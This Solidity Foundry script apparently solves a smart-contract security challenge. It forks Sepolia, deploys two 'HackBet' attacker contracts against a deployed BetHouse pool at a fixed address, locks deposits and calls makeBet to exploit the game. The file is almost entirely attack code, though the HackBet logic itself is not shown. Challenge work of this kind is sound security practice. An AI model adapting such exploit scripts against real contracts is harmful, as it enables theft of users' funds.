// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";

import {BetHouse, Pool, PoolToken, HackBet} from "../src/BetHouse.sol";

contract StakeScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address betHouseContractAddress = 0xa8D3EebE64A9c89797E27C0601Ed5DC467Fd7e9a;
        BetHouse betHouseContract = BetHouse(betHouseContractAddress);

        address userAddress = 0xA01f6403d49857b58D3794C12E028c3681b24F98;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        Pool poolContract = Pool(betHouseContract.pool());

        HackBet hackBet1 = new HackBet();

        HackBet hackBet2 = new HackBet();

        hackBet1.hack{value: 0.001 ether}(address(poolContract));

        hackBet2.hack{value: 0.001 ether}(address(poolContract));

        // poolContract.deposit(0);

        poolContract.lockDeposits();

        betHouseContract.makeBet(userAddress);

        vm.stopBroadcast();
    }
}
